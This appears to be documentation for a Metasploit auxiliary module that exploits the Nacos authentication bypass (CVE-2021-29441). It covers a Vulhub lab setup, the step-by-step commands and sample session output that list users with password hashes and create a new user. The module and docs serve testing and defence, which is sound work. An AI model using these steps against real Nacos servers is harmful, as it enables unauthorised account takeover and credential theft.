## Vulnerable Application

This module exploits an authentication bypass vulnerability in Alibaba Nacos versions prior to **1.4.1** (CVE-2021-29441).

The vulnerability exists because Nacos trusts requests containing the `User-Agent: Nacos-Server` header without verifying that the request originated from another trusted Nacos server. An unauthenticated attacker can abuse this behavior to bypass authentication and perform privileged administrative actions.

This module supports the following operations:

- Check if the target is vulnerable
- Enumerate users
- Create a new user
- Delete an existing user
- Update a user's password

The vulnerability was fixed in **Nacos 1.4.1**.

## Testing

A vulnerable environment can be deployed using Vulhub.

Clone the repository:

```
git clone https://github.com/vulhub/vulhub.git
cd vulhub/nacos/CVE-2021-29441
```

Start the vulnerable environment:

```
docker-compose up -d
```

The vulnerable Nacos instance will be available on port **8848**.

**Successfully tested on**

- Alibaba Nacos 1.4.0

## Verification Steps

1. Deploy the Vulhub Nacos CVE-2021-29441 environment.
2. Start `msfconsole`.
3. `use auxiliary/admin/http/nacos_auth_bypass`
4. `set RHOSTS <target>`
5. `set ACTION LIST_USERS`
6. `run`
7. If the target is vulnerable, the configured users should be displayed.

To create a new user:

1. `set ACTION CREATE_USER`
2. `set USERNAME metasploit`
3. `set PASSWORD Password123!`
4. `run`

## Options

### USERNAME

Username used by the `CREATE_USER`, `DELETE_USER`, `UPDATE_PASSWORD`, and `EXPLOIT` actions.

### PASSWORD

Password used when creating a new user.

### NEW_PASSWORD

New password assigned during the `UPDATE_PASSWORD` action.

### ACTION

The action to perform.

Supported values are:

- CHECK
- LIST_USERS
- CREATE_USER
- DELETE_USER
- UPDATE_PASSWORD
- EXPLOIT

## Scenarios

Running the module against a vulnerable Nacos 1.4.0 instance:

```
msf6 > use auxiliary/admin/http/nacos_auth_bypass
msf auxiliary(admin/http/nacos_auth_bypass) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf auxiliary(admin/http/nacos_auth_bypass) > set ACTION LIST_USERS
ACTION => LIST_USERS
msf auxiliary(admin/http/nacos_auth_bypass) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Target appears vulnerable to Nacos authentication bypass
[*] Listing users...
Nacos Users
===========

Username    Password                                                      Roles
--------    --------                                                      -----
metasploit  $2a$10$4AxVyLxNd7v3X1VM3mzJleohavV72JWcUOBEDwTeuY2zdh09H772i  user
nacos       $2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu  user

[*] Auxiliary module execution completed
msf auxiliary(admin/http/nacos_auth_bypass) > 

```

Creating a new user:

```
msf auxiliary(admin/http/nacos_auth_bypass) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(admin/http/nacos_auth_bypass) > set ACTION CREATE_USER
ACTION => CREATE_USER
msf auxiliary(admin/http/nacos_auth_bypass) > set USERNAME metasploit
USERNAME => metasploit
msf auxiliary(admin/http/nacos_auth_bypass) > set PASSWORD Password123!
PASSWORD => Password123!
msf auxiliary(admin/http/nacos_auth_bypass) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Target appears vulnerable to Nacos authentication bypass
[*] Creating user 'metasploit'...
[+] user metasploit with password Password123! created successfully
[*] Auxiliary module execution completed
msf auxiliary(admin/http/nacos_auth_bypass) > 
```
